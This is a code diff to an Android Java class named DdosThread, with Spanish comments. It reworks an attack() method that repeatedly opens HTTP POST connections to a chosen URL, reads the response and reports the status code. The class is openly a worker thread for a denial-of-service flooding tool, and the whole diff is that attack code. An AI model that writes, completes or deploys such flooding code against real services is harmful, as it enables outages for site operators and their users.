@@ -4,7 +4,9 @@ import android.os.Looper;
 import android.os.MessageQueue;
 import android.util.Log;
 
+import java.io.BufferedReader;
 import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -23,8 +25,6 @@ public class DdosThread extends Thread{
     private String request;
     private URL url;
 
-    String param = null;
-
     public DdosThread(){
         this.id = ++autoId;
     }
@@ -32,8 +32,7 @@ public class DdosThread extends Thread{
     public void setRequestURL(String request) {
         this.request = request;
         try{
-            url = new URL(request);
-            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
+            this.url = new URL(request);
         }catch (Exception e){
         }
     }
@@ -52,20 +51,42 @@ public class DdosThread extends Thread{
     }
 
     public void attack() throws Exception {
+        HttpURLConnection connection = null;
+        OutputStream out = null;
+        InputStream in = null;
+        StringBuilder respuesta = new StringBuilder();
 
-        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-        connection.setDoOutput(true);
-        connection.setDoInput(true);
-        connection.setRequestMethod("POST");
+        //Creamos un objeto connection
+        connection = (HttpURLConnection) this.url.openConnection();
         connection.setRequestProperty("charset", "utf-8");
-        connection.setRequestProperty("Host", "localhost");
-        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
         connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-        connection.setRequestProperty("Content-Length", param);
+        connection.setDoInput(true);
+        connection.setDoOutput(true);
+
+        String cadena = "";
+        byte[] data = cadena.getBytes("utf-8");
+
+        out = connection.getOutputStream();
+        out.write(data);
+        out.close();
+
+        in = connection.getInputStream();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
+        String line = null;
+
+        while ((line = reader.readLine()) != null) {
+            respuesta.append(line);
+        }
+
+        if (out != null) out.close();
+
+        if (in != null) in.close();
+
+        if (connection != null) connection.disconnect();
+
+        System.out.println(connection.getResponseCode());
 
         notificar("Reponse code -> "+ connection.getResponseCode());
-
-        connection.getInputStream();
 
     }
 
